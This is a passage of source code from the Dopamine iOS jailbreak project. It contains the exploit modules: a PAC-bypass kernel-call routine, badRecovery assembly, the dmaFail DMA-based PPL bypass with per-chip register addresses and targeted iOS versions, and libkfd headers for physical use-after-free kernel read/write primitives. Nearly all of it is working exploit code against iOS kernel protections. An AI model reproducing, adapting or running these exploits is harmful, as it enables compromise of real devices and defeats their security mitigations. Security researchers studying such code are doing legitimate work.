    uint64_t a7 = argc >= 7 ? argv[6] : 0;
    uint64_t a8 = argc >= 8 ? argv[7] : 0;
    return fugu15_kcall_on_thread(&fugu15ExploitThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
}

void fugu15_kexec(kRegisterState state)
{
    fugu15_kexec_on_thread(&fugu15ExploitThread, &state);
}

bool kexec_on_new_thread(kRegisterState *kState, thread_t *thread)
{
    arm_thread_state64_t state;
    bzero(&state, sizeof(state));
    
    arm_thread_state64_set_pc_fptr(state, (void*) pac_loop);
    for (size_t i = 0; i < 29; i++) {
        state.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &state, ARM_THREAD_STATE64_COUNT, thread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] kexec_on_new_thread: Failed to create new thread!");
        return false;
    }
    
    thread_suspend(*thread);
    thread_abort(*thread);
    
    uint64_t threadPtr = task_get_ipc_port_kobject(task_self(), *thread);
    guard (threadPtr != 0) else {
        puts("[-] kexec_on_new_thread: Failed to find new thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(threadPtr);
    
    kRegisterState *threadACTContext = (kRegisterState*) kread_ptr(threadPtr + koffsetof(thread, machine_contextData));
    guard (threadACTContext != NULL) else {
        puts("[-] kexec_on_new_thread: New thread has no ACT_CONTEXT?!");
        return false;
    }
    
    // Write new state (only important stuff)
    size_t sizeToWrite = offsetof(kRegisterState, other[0]) - offsetof(kRegisterState, x[0]);
    kwritebuf((uint64_t) &threadACTContext->x[0], &kState->x[0], sizeToWrite);
    
    // Resign it
    kcall(NULL, ksymbol(ml_sign_thread_state), 6, (uint64_t[]){(uint64_t) threadACTContext, kState->pc, kState->cpsr, kState->lr, kState->x[16], kState->x[17]});
    
    // Resume
    thread_resume(*thread);
    
    return true;
}


int exploit_init(const char *flavor)
{
    breakCFI();
    fugu14_kcall_init(^int(mach_port_t threadPort) {
        return sign_kernel_thread(proc_self(), threadPort);
    });
    deinitFugu15PACBypass();
    return 0;
}

int exploit_deinit(void)
{
    return 0;
}

```

`Application/Dopamine/Exploits/badRecovery/badRecovery.s`:

```s
//
//  badRecovery.s
//  badRecovery
//
//  Created by Lars Fröder on 26.01.24.
//

//
//  asm.S
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

.text

.align 4

#define SYSCALL_PROLOGUE stp x0, x1, [sp, -16]! %% stp x2, x3, [sp, -16]! %% stp x4, x5, [sp, -16]! %% stp x6, x7, [sp, -16]!
#define SYSCALL_EPILOGUE ldp x6, x7, [sp], 16 %% ldp x4, x5, [sp], 16 %% ldp x2, x3, [sp], 16 %% ldp x0, x1, [sp], 16

#define DEF_SYSCALL(name, num)  .global _##name %% _##name: %% SYSCALL_PROLOGUE %% mov x16, num %% svc #0x80 %% mov x16, x0 %% SYSCALL_EPILOGUE %% bcc name##_end %% cmp x16, #4 %% beq _##name %% mov x16, #-1 %% name##_end: %% mov x0, x16 %% ret
#define DEF_MACHTRAP(name, num) .global _##name %% _##name: %% mov x16, -num %% svc #0x80 %% ret

.global _pac_exploit_thread
_pac_exploit_thread:
    mov x0, x20
    bl _mach_port_mod_refs
    b _pac_exploit_thread

.global _pac_exploit_doIt
_pac_exploit_doIt:
    ldr x24, [x11, x25]
    dmb sy
    cmp x24, x20
    bne _pac_exploit_doIt
_pac_exploit_doIt_cont:
    str x19, [x11, x26]
    dmb sy
    ldr x24, [x11, x25]
    dmb sy
    cmp x24, x20
    bne _pac_exploit_doIt
    str x18, [x11, x27]
    dmb sy
    b _pac_exploit_doIt_cont

DEF_SYSCALL(exit,  1)
DEF_SYSCALL(write, 4)
DEF_SYSCALL(getpid, 20)
DEF_SYSCALL(getppid, 39)
DEF_SYSCALL(__semwait_signal, 334)

DEF_MACHTRAP(vm_allocate, 10)
DEF_MACHTRAP(vm_deallocate, 12)
DEF_MACHTRAP(vm_protect, 14)
DEF_MACHTRAP(mach_port_allocate, 16)
DEF_MACHTRAP(mach_port_deallocate, 18)
DEF_MACHTRAP(mach_port_mod_refs, 19)
DEF_MACHTRAP(mach_port_insert_right, 21)
DEF_MACHTRAP(mach_reply_port, 26)
DEF_MACHTRAP(mach_thread_self, 27)
DEF_MACHTRAP(mach_task_self, 28)
DEF_MACHTRAP(mach_host_self, 29)
DEF_MACHTRAP(mach_msg_trap, 31)
DEF_MACHTRAP(mach_msg_overwrite_trap, 32)
DEF_MACHTRAP(thread_switch, 61)

.data
retvalStorage:
    .quad 0

```

`Application/Dopamine/Exploits/dmaFail/Info.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>DPExploitFlavors</key>
	<dict>
		<key>default</key>
		<dict>
			<key>DPFlavorPriority</key>
			<integer>1000</integer>
			<key>DPSupportedRanges</key>
			<array>
				<dict>
					<key>Start</key>
					<string>15.0</string>
					<key>End</key>
					<string>16.5.1</string>
				</dict>
			</array>
			<key>DPSupportExclude</key>
			<array>
				<dict>
					<key>Devices</key>
					<array>
						<string>A15</string>
						<string>A16</string>
					</array>
					<key>Builds</key>
					<array>
						<string>20F75</string>
					</array>
				</dict>
			</array>
			<key>DPSupportInclude</key>
			<array>
				<dict>
					<key>Builds</key>
					<array>
						<string>20G5026e</string>
						<string>20G5037d</string>
						<string>20G5047d</string>
						<string>20G5058d</string>
					</array>
				</dict>
			</array>
		</dict>
	</dict>
	<key>DPExploitType</key>
	<string>PPL</string>
	<key>CFBundleDisplayName</key>
	<string>dmaFail</string>
</dict>
</plist>

```

`Application/Dopamine/Exploits/dmaFail/dmaFail.c`:

```c
//
//  dmaFail.c
//  Dopamine
//
//  Created by Lars Fröder on 13.01.24.
//

#include <stdio.h>
#include <libjailbreak/primitives.h>
#include <libjailbreak/translation.h>
#include <libjailbreak/info.h>
#include <libjailbreak/kernel.h>
#include <libjailbreak/util.h>
#include <dlfcn.h>
#include <mach-o/dyld.h>
#include <sys/sysctl.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>

#define DBGWRAP_DBGHALT          (1ULL << 31)
#define DBGWRAP_DBGACK           (1ULL << 28)

struct shit_map {
    uint64_t pa;
    uint8_t *ua;
};
#define CACHED_MAP_LEN 20
struct shit_map gCachedMap[CACHED_MAP_LEN];
bool gIsA15A16 = false;
uint64_t gGFXBase = 0;
uint32_t gGFXCommand = 0;
uint64_t gDMAIndex = 0;
uint64_t gDMAMask = 0;


static int physwritebuf_ppl(uint64_t physaddr, const void* input, size_t size);

void addMapping(uint64_t addr)
{
    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        uint64_t page = addr & ~PAGE_MASK;
        if (gCachedMap[i].pa == page) {
            break;
        }
        else if (gCachedMap[i].pa == 0) {
            gCachedMap[i].pa = page;
            if (gPrimitives.kwritebuf || gPrimitives.physwritebuf != physwritebuf_ppl) {
                kmap(gCachedMap[i].pa, 0x4000, (void **)&gCachedMap[i].ua);
                printf("Mapped %llx to %p\n", gCachedMap[i].pa, gCachedMap[i].ua);
            }
            else {
                printf("Prevented mapping because we can't do it\n");
            }
            break;
        }
    }
}

void clearMappings(void)
{
    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        if (gCachedMap[i].pa) {
            vm_deallocate(mach_task_self_, (vm_address_t)gCachedMap[i].ua, 0x4000);
            gCachedMap[i].pa = 0;
            gCachedMap[i].ua = NULL;
        }
    }
}

void physwrite64_mapped(uint64_t addr, uint64_t val)
{
    addMapping(addr);

    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        uint64_t page = addr & ~PAGE_MASK;
        uint64_t off = addr & PAGE_MASK;
        if (gCachedMap[i].pa == page) {
            *(uint64_t *)(gCachedMap[i].ua + off) = val;
        }
    }
}

uint64_t physread64_mapped(uint64_t addr)
{
    addMapping(addr);

    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        uint64_t page = addr & ~PAGE_MASK;
        uint64_t off = addr & PAGE_MASK;
        if (gCachedMap[i].pa == page) {
            return *(uint64_t *)(gCachedMap[i].ua + off);
        }
    }
    return 0;
}

void physwrite32_mapped(uint64_t addr, uint32_t val)
{
    addMapping(addr);

    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        uint64_t page = addr & ~PAGE_MASK;
        uint64_t off = addr & PAGE_MASK;
        if (gCachedMap[i].pa == page) {
            *(uint32_t *)(gCachedMap[i].ua + off) = val;
            break;
        }
    }
}

uint32_t physread32_mapped(uint64_t addr)
{
    addMapping(addr);

    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        uint64_t page = addr & ~PAGE_MASK;
        uint64_t off = addr & PAGE_MASK;
        if (gCachedMap[i].pa == page) {
            return *(uint32_t *)(gCachedMap[i].ua + off);
        }
    }
    return 0;
}

void ml_dbgwrap_halt_cpu(void)
{
    if ((physread64_mapped(0x206040000) & DBGWRAP_DBGHALT) != 0) {
        return;
    }
    
    physwrite64_mapped(0x206040000, physread64_mapped(0x206040000) | DBGWRAP_DBGHALT);
    
    while ((physread64_mapped(0x206040000) & DBGWRAP_DBGACK) == 0) { }
}

void ml_dbgwrap_unhalt_cpu(void)
{
    physwrite64_mapped(0x206040000, ((physread64_mapped(0x206040000) & 0xFFFFFFFF2FFFFFFF) | 0x40000000));
    if ((physread64_mapped(0x206040000) & DBGWRAP_DBGHALT) != 0) {
        return;
    }
    while ((physread64_mapped(0x206040000) & DBGWRAP_DBGACK) != 0) { }
}

void gfx_power_init(void)
{
    if ((~physread32_mapped(gGFXBase) & 0xF) != 0) {
        physwrite32_mapped(gGFXBase, gGFXCommand);
        while(true) {
            if ((~physread32_mapped(gGFXBase) & 0xF) == 0) {
                break;
            }
        }
    }
}

void dma_ctrl_1(void)
{
    uint64_t ctrl = 0x206140108;
    uint64_t value = physread64_mapped(ctrl);
    physwrite64_mapped(ctrl, value | 0x8000000000000001);
    //sleep(1);

    while ((~physread64_mapped(ctrl) & 0x8000000000000001) != 0) { /*sleep(1);*/ }
}

void dma_ctrl_2(bool flag)
{
    uint64_t ctrl = 0x206140008;
    uint64_t value = physread64_mapped(ctrl);

    if (flag) {
        if ((value & 0x1000000000000000) == 0) {
            value |= 0x1000000000000000;
            physwrite64_mapped(ctrl, value);
        }
    }
    else {
        if ((value & 0x1000000000000000) != 0) {
            value &= ~0x1000000000000000;
            physwrite64_mapped(ctrl, value);
        }
    }
}

void dma_ctrl_3(uint64_t value)
{
    uint64_t ctrl = 0x206140108;
    value |= 0x8000000000000000;

    physwrite64_mapped(ctrl, physread64_mapped(ctrl) & value);

    while ((physread64_mapped(ctrl) & 0x8000000000000001) != 0) { /*sleep(1);*/ }
}

void dma_init(uint64_t orig)
{
    dma_ctrl_1();
    dma_ctrl_2(false);
    dma_ctrl_3(orig);
}

void dma_done(uint64_t orig)
{
    dma_ctrl_1();
    dma_ctrl_2(true);
    dma_ctrl_3(orig);
}

uint64_t sbox[] = {
    0x007, 0x00B, 0x00D, 0x013, 0x00E, 0x015, 0x01F, 0x016,
    0x019, 0x023, 0x02F, 0x037, 0x04F, 0x01A, 0x025, 0x043,
    0x03B, 0x057, 0x08F, 0x01C, 0x026, 0x029, 0x03D, 0x045,
    0x05B, 0x083, 0x097, 0x03E, 0x05D, 0x09B, 0x067, 0x117,
    0x02A, 0x031, 0x046, 0x049, 0x085, 0x103, 0x05E, 0x09D,
    0x06B, 0x0A7, 0x11B, 0x217, 0x09E, 0x06D, 0x0AB, 0x0C7,
    0x127, 0x02C, 0x032, 0x04A, 0x051, 0x086, 0x089, 0x105,
    0x203, 0x06E, 0x0AD, 0x12B, 0x147, 0x227, 0x034, 0x04C,
    0x052, 0x076, 0x08A, 0x091, 0x0AE, 0x106, 0x109, 0x0D3,
    0x12D, 0x205, 0x22B, 0x247, 0x07A, 0x0D5, 0x153, 0x22D,
    0x038, 0x054, 0x08C, 0x092, 0x061, 0x10A, 0x111, 0x206,
    0x209, 0x07C, 0x0BA, 0x0D6, 0x155, 0x193, 0x253, 0x28B,
    0x307, 0x0BC, 0x0DA, 0x156, 0x255, 0x293, 0x30B, 0x058,
    0x094, 0x062, 0x10C, 0x112, 0x0A1, 0x20A, 0x211, 0x0DC,
    0x196, 0x199, 0x256, 0x165, 0x259, 0x263, 0x30D, 0x313,
    0x098, 0x064, 0x114, 0x0A2, 0x15C, 0x0EA, 0x20C, 0x0C1,
    0x121, 0x212, 0x166, 0x19A, 0x299, 0x265, 0x2A3, 0x315,
    0x0EC, 0x1A6, 0x29A, 0x266, 0x1A9, 0x269, 0x319, 0x2C3,
    0x323, 0x068, 0x0A4, 0x118, 0x0C2, 0x122, 0x214, 0x141,
    0x221, 0x0F4, 0x16C, 0x1AA, 0x2A9, 0x325, 0x343, 0x0F8,
    0x174, 0x1AC, 0x2AA, 0x326, 0x329, 0x345, 0x383, 0x070,
    0x0A8, 0x0C4, 0x124, 0x218, 0x142, 0x222, 0x181, 0x241,
    0x178, 0x2AC, 0x32A, 0x2D1, 0x0B0, 0x0C8, 0x128, 0x144,
    0x1B8, 0x224, 0x1D4, 0x182, 0x242, 0x2D2, 0x32C, 0x281,
    0x351, 0x389, 0x1D8, 0x2D4, 0x352, 0x38A, 0x391, 0x0D0,
    0x130, 0x148, 0x228, 0x184, 0x244, 0x282, 0x301, 0x1E4,
    0x2D8, 0x354, 0x38C, 0x392, 0x1E8, 0x2E4, 0x358, 0x394,
    0x362, 0x3A1, 0x150, 0x230, 0x188, 0x248, 0x284, 0x302,
    0x1F0, 0x2E8, 0x364, 0x398, 0x3A2, 0x0E0, 0x190, 0x250,
    0x2F0, 0x288, 0x368, 0x304, 0x3A4, 0x370, 0x3A8, 0x3C4,
    0x160, 0x290, 0x308, 0x3B0, 0x3C8, 0x3D0, 0x1A0, 0x260,
    0x310, 0x1C0, 0x2A0, 0x3E0, 0x2C0, 0x320, 0x340, 0x380
};

uint64_t calculate_hash(uint64_t buffer)
{
    uint64_t acc = 0;
    for (uint32_t i = 0; i < 8; i++) {
        uint32_t pos = i * 4;
        uint32_t value = physread32(buffer + pos);
        for (int j = 0; j < 32; j++) {
            if (((value >> j) & 1) != 0) {
                acc ^= sbox[32 * i + j];
            }
        }
    }
    return acc;
}


void dma_writephys512(uint64_t targetPA, uint64_t *value)
{
    uint64_t tte = kread64(pmap_self() + koffsetof(pmap, tte));
    uint64_t valuePA = vtophys(tte, (uint64_t)value);
    //assert(valuePA != 0);

    cpu_subtype_t cpuFamily = 0;
    size_t cpuFamilySize = sizeof(cpuFamily);
    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);

    uint64_t orig = physread64_mapped(0x206140108);
    dma_init(orig);

    uint64_t hash1 = calculate_hash(valuePA);
    uint64_t hash2 = calculate_hash(valuePA + 0x20);

    physwrite64_mapped(0x206150040, 0x2000000 | (targetPA & 0x3FC0));

    uint32_t pos = 0;
    while (pos < 0x40) {
        physwrite64_mapped(0x206150048, physread64(valuePA + pos));
        pos += 8;
    }

    uint64_t targetPAUpper = ((((targetPA >> 14) & gDMAMask) << 18) & 0x3FFFFFFFFFFFF);
    physwrite64_mapped(0x206150048, targetPAUpper | (hash1 << gDMAIndex) | (hash2 << 50) | 0x1f);

    dma_done(orig);
}

void dma_writephysbuf(uint64_t pa, const void *input, size_t size)
{
    size_t sizeLeft = size;
    uint8_t *inputData = (uint8_t *)input;

    while (sizeLeft > 0) {
        uint64_t curCacheLinePA = pa & ~0x3f;
        uint64_t curCacheLineOff = pa & 0x3f;
        uint64_t writeSize = min(sizeLeft, 0x40 - curCacheLineOff);
        
        uint8_t curCacheLine[0x40];
        uint64_t curCacheLineVirt = phystokv(curCacheLinePA);
        kreadbuf(curCacheLineVirt, curCacheLine, sizeof(curCacheLine));
        
        memcpy(&curCacheLine[curCacheLineOff], &inputData[size-sizeLeft], writeSize);
        
        dma_writephys512(curCacheLinePA, (uint64_t *)curCacheLine);

        pa += writeSize;
        sizeLeft -= writeSize;
    }
}

void dma_writephys64(uint64_t pa, uint64_t val)
{
    dma_writephysbuf(pa, &val, sizeof(val));
}

void dma_writephys32(uint64_t pa, uint32_t val)
{
    dma_writephysbuf(pa, &val, sizeof(val));
}

void dma_writephys16(uint64_t pa, uint16_t val)
{
    dma_writephysbuf(pa, &val, sizeof(val));
}

void dma_writephys8(uint64_t pa, uint8_t val)
{
    dma_writephysbuf(pa, &val, sizeof(val));
}

void dma_perform(void (^block)(void))
{
    gfx_power_init();

    uint64_t backup = 0;
    if (gIsA15A16) {
        backup = physread64_mapped(0x206150020);
        physwrite64_mapped(0x206150020, 1);
    }
    
    ml_dbgwrap_halt_cpu();
    
    block();
    
    ml_dbgwrap_unhalt_cpu();
    
    if (gIsA15A16) {
        physwrite64_mapped(0x206150020, backup);
    }
}

static int physwritebuf_ppl(uint64_t physaddr, const void* input, size_t size)
{
    assert(physaddr >= kconstant(physBase));
    assert(physaddr < kconstant(physBase) + kconstant(physSize));

    while (true) {
        dma_perform(^{
            dma_writephysbuf(physaddr, input, size);
        });
        
        // It seems sometimes the writes can be a little delayed because we are writing to a cache after all
        // In this case repeat the writes until the bytes we read back match what we expect
        uint8_t checkBuf[size];
        physreadbuf(physaddr, checkBuf, size);
        if (!memcmp(input, checkBuf, size)) {
            break;
        }
    }
    return 0;
}

int exploit_init(const char *flavor)
{
    cpu_subtype_t cpuFamily = 0;
    size_t cpuFamilySize = sizeof(cpuFamily);
    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);

    switch (cpuFamily) {
        case 0x8765EDEA: // A16
            gGFXBase = 0x23B700408;
            gGFXCommand = 0x1F0023FF;
            gDMAIndex = 8;
            gDMAMask = 0x7FFFFFF;
            gIsA15A16 = true;
            break;
        case 0xDA33D83D: // A15
            gGFXBase = 0x23B7003C8;
            gGFXCommand = 0x1F0023FF;
            gDMAIndex = 8;
            gDMAMask = 0x7FFFFFF;
            gIsA15A16 = true;
            break;
        case 0x1B588BB3: // A14
            gGFXBase = 0x23B7003D0;
            gGFXCommand = 0x1F0023FF;
            gDMAIndex = 0x28;
            gDMAMask = 0x3FFFFF;
            break;
        case 0x462504D2: // A13
            gGFXBase = 0x23B080390;
            gGFXCommand = 0x1F0003FF;
            gDMAIndex = 0x28;
            gDMAMask = 0x3FFFFF;
            break;
        case 0x07D34B9F: // A12
            gGFXBase = 0x23B080388;
            gGFXCommand = 0x1F0003FF;
            gDMAIndex = 0x28;
            gDMAMask = 0x3FFFFF;
            break;
        default:
            return -1;
    }
    
    // Pre map all pages we need
    addMapping(gGFXBase);
    addMapping(0x206040000);
    addMapping(0x206140000);
    addMapping(0x206150000);
    
    gPrimitives.physwritebuf = physwritebuf_ppl;
    return 0;
}

int exploit_deinit(void)
{
    clearMappings();
    if (gPrimitives.physwritebuf == physwritebuf_ppl) {
        gPrimitives.physwritebuf = NULL;
    }
    return 0;
}

```

`Application/Dopamine/Exploits/dmaFail/dmaFail.h`:

```h
//
//  dmaFail.h
//  dmaFail
//
//  Created by Lars Fröder on 13.01.24.
//

#import <Foundation/Foundation.h>

//! Project version number for dmaFail.
FOUNDATION_EXPORT double dmaFailVersionNumber;

//! Project version string for dmaFail.
FOUNDATION_EXPORT const unsigned char dmaFailVersionString[];

// In this header, you should import all the public headers of your framework using statements like #import <dmaFail/PublicHeader.h>



```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef libkfd_h
#define libkfd_h

/*
 * The global configuration parameters of libkfd.
 */
#define CONFIG_ASSERT 1
#define CONFIG_PRINT 1
#define CONFIG_TIMER 1

#include "libkfd/common.h"

/*
 * The public API of libkfd.
 */

enum puaf_method {
    puaf_physpuppet,
    puaf_smith,
    puaf_landa,
};

enum kread_method {
    kread_kqueue_workloop_ctl,
    kread_sem_open,
    kread_IOSurface,
};

enum kwrite_method {
    kwrite_dup,
    kwrite_sem_open,
    kwrite_IOSurface,
};

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);
void kclose(u64 kfd);

/*
 * The private API of libkfd.
 */

struct kfd; // Forward declaration for function pointers.

struct info {
    struct {
        vm_address_t src_uaddr;
        vm_address_t dst_uaddr;
        vm_size_t size;
    } copy;
    struct {
        i32 pid;
        u64 tid;
        u64 vid;
        u64 maxfilesperproc;
        char kern_version[512];
    } env;
    struct {
        u64 kernel_slide;
        u64 current_map;
        u64 current_pmap;
        u64 current_proc;
        u64 current_task;
        u64 current_thread;
        u64 current_uthread;
        u64 kernel_map;
        u64 kernel_pmap;
        u64 kernel_proc;
        u64 kernel_task;
    } kaddr;
};

struct perf {
    u64 gVirtBase;
    u64 gPhysBase;
    u64 gPhysSize;
    struct {
        u64 pa;
        u64 va;
    } ttbr[2];
    struct ptov_table_entry {
        u64 pa;
        u64 va;
        u64 len;
    } ptov_table[8];
    struct {
        u64 kaddr;
        u64 paddr;
        u64 uaddr;
        u64 size;
    } shared_page;
    struct {
        i32 fd;
        u32 si_rdev_buffer[2];
        u64 si_rdev_kaddr;
    } dev;
    void (*saved_kread)(struct kfd*, u64, void*, u64);
    void (*saved_kwrite)(struct kfd*, void*, u64, u64);
};

struct puaf {
    u64 number_of_puaf_pages;
    u64* puaf_pages_uaddr;
    void* puaf_method_data;
    u64 puaf_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*run)(struct kfd*);
        void (*cleanup)(struct kfd*);
        void (*free)(struct kfd*);
        void (*deallocate)(struct kfd*);
    } puaf_method_ops;
};

struct krkw {
    u64 krkw_maximum_id;
    u64 krkw_allocated_id;
    u64 krkw_searched_id;
    u64 krkw_object_id;
    u64 krkw_object_uaddr;
    u64 krkw_object_size;
    void* krkw_method_data;
    u64 krkw_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*allocate)(struct kfd*, u64);
        bool (*search)(struct kfd*, u64);
        void (*kread)(struct kfd*, u64, void*, u64);
        void (*kwrite)(struct kfd*, void*, u64, u64);
        void (*find_proc)(struct kfd*);
        void (*deallocate)(struct kfd*, u64);
        void (*free)(struct kfd*);
    } krkw_method_ops;
};

struct kfd {
    struct info info;
    struct perf perf;
    struct puaf puaf;
    struct krkw kread;
    struct krkw kwrite;
};

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"

struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    //timer_start();

    const u64 puaf_pages_min = 16;
    const u64 puaf_pages_max = 3072;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_landa);
    assert(kread_method <= kread_IOSurface);
    assert(kwrite_method <= kwrite_IOSurface);

    struct kfd* kfd = NULL;
    
retry:
    kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
    puaf_run(kfd);
    if(krkw_run(kfd) == false) {
        if(puaf_method == puaf_landa) {
            kfd->puaf.puaf_method_ops.deallocate(kfd);
            puaf_free(kfd);
            kfd = NULL;
            goto retry;
        }
    }
    info_run(kfd);
    perf_run(kfd);
    puaf_cleanup(kfd);

    //timer_end();
    return (u64)(kfd);
}

void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
{
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
{
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}

void kclose(u64 kfd)
{
    kfd_free((struct kfd*)(kfd));
}

#endif /* libkfd_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/common.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef common_h
#define common_h

#include <errno.h>
#include <mach/mach.h>
#include <pthread.h>
#include <semaphore.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/sysctl.h>
#include <unistd.h>

#define pages(number_of_pages) ((number_of_pages) * (ARM_PGBYTES))

#define min(a, b) (((a) < (b)) ? (a) : (b))
#define max(a, b) (((a) > (b)) ? (a) : (b))

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;
typedef intptr_t isize;

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;
typedef uintptr_t usize;

/*
 * Helper print macros.
 */

#if CONFIG_PRINT

#define print(args...) printf(args)

#else /* CONFIG_PRINT */

#define print(args...)

#endif /* CONFIG_PRINT */

#define print_bool(name) print("[%s]: %s = %s\n", __FUNCTION__, #name, name ? "true" : "false")

#define print_i8(name) print("[%s]: %s = %hhi\n", __FUNCTION__, #name, name)
#define print_u8(name) print("[%s]: %s = %hhu\n", __FUNCTION__, #name, name)
#define print_x8(name) print("[%s]: %s = %02hhx\n", __FUNCTION__, #name, name)

#define print_i16(name) print("[%s]: %s = %hi\n", __FUNCTION__, #name, name)
#define print_u16(name) print("[%s]: %s = %hu\n", __FUNCTION__, #name, name)
#define print_x16(name) print("[%s]: %s = %04hx\n", __FUNCTION__, #name, name)

#define print_i32(name) print("[%s]: %s = %i\n", __FUNCTION__, #name, name)
#define print_u32(name) print("[%s]: %s = %u\n", __FUNCTION__, #name, name)
#define print_x32(name) print("[%s]: %s = %08x\n", __FUNCTION__, #name, name)

#define print_i64(name) print("[%s]: %s = %lli\n", __FUNCTION__, #name, name)
#define print_u64(name) print("[%s]: %s = %llu\n", __FUNCTION__, #name, name)
#define print_x64(name) print("[%s]: %s = %016llx\n", __FUNCTION__, #name, name)

#define print_isize(name) print("[%s]: %s = %li\n", __FUNCTION__, #name, name)
#define print_usize(name) print("[%s]: %s = %lu\n", __FUNCTION__, #name, name)
#define print_xsize(name) print("[%s]: %s = %016lx\n", __FUNCTION__, #name, name)

#define print_string(name) print("[%s]: %s = %s\n", __FUNCTION__, #name, name)

#define print_message(args...) do { print("[%s]: ", __FUNCTION__); print(args); print("\n"); } while (0)
#define print_success(args...) do { print("[%s]: 🟢 ", __FUNCTION__); print(args); print("\n"); } while (0)
#define print_warning(args...) do { print("[%s]: 🟡 ", __FUNCTION__); print(args); print("\n"); } while (0)
#define print_failure(args...) do { print("[%s]: 🔴 ", __FUNCTION__); print(args); print("\n"); } while (0)

#define print_timer(tv)                                           \
    do {                                                          \
        u64 sec = ((tv)->tv_sec);                                 \
        u64 msec = ((tv)->tv_usec) / 1000;                        \
        u64 usec = ((tv)->tv_usec) % 1000;                        \
        print_success("%llus %llums %lluus", sec, msec, usec);    \
    } while (0)

#define print_buffer(uaddr, size)                                          \
    do {                                                                   \
        const u64 u64_per_line = 8;                                        \
        volatile u64* u64_base = (volatile u64*)(uaddr);                   \
        u64 u64_size = ((u64)(size) / sizeof(u64));                        \
        for (u64 u64_offset = 0; u64_offset < u64_size; u64_offset++) {    \
            if ((u64_offset % u64_per_line) == 0) {                        \
                print("[0x%04llx]: ", u64_offset * sizeof(u64));           \
            }                                                              \
            print("%016llx", u64_base[u64_offset]);                        \
            if ((u64_offset % u64_per_line) == (u64_per_line - 1)) {       \
                print("\n");                                               \
            } else {                                                       \
                print(" ");                                                \
            }                                                              \
        }                                                                  \
        if ((u64_size % u64_per_line) != 0) {                              \
            print("\n");                                                   \
        }                                                                  \
    } while (0)

/*
 * Helper assert macros.
 */

#if CONFIG_ASSERT

#define assert(condition)                                               \
    do {                                                                \
        if (!(condition)) {                                             \
            print_failure("assertion failed: (%s)", #condition);        \
            print_failure("file: %s, line: %d", __FILE__, __LINE__);    \
            print_failure("... sleep(30) before exit(1) ...");          \
            sleep(30);                                                  \
            exit(1);                                                    \
        }                                                               \
    } while (0)

#else /* CONFIG_ASSERT */

#define assert(condition)

#endif /* CONFIG_ASSERT */

#define assert_false(message)                   \
    do {                                        \
        print_failure("error: %s", message);    \
        assert(false);                          \
    } while (0)

#define assert_bsd(statement)                                                                        \
    do {                                                                                             \
        kern_return_t kret = (statement);                                                            \
        if (kret != KERN_SUCCESS) {                                                                  \
            print_failure("bsd error: kret = %d, errno = %d (%s)", kret, errno, strerror(errno));    \
            assert(kret == KERN_SUCCESS);                                                            \
        }                                                                                            \
    } while (0)

#define assert_mach(statement)                                                             \
    do {                                                                                   \
        kern_return_t kret = (statement);                                                  \
        if (kret != KERN_SUCCESS) {                                                        \
            print_failure("mach error: kret = %d (%s)", kret, mach_error_string(kret));    \
            assert(kret == KERN_SUCCESS);                                                  \
        }                                                                                  \
    } while (0)

/*
 * Helper timer macros.
 */

#if CONFIG_TIMER

#define timer_start()                                 \
    struct timeval tv_start;                          \
    do {                                              \
        assert_bsd(gettimeofday(&tv_start, NULL));    \
    } while (0)

#define timer_end()                                 \
    do {                                            \
        struct timeval tv_end, tv_diff;             \
        assert_bsd(gettimeofday(&tv_end, NULL));    \
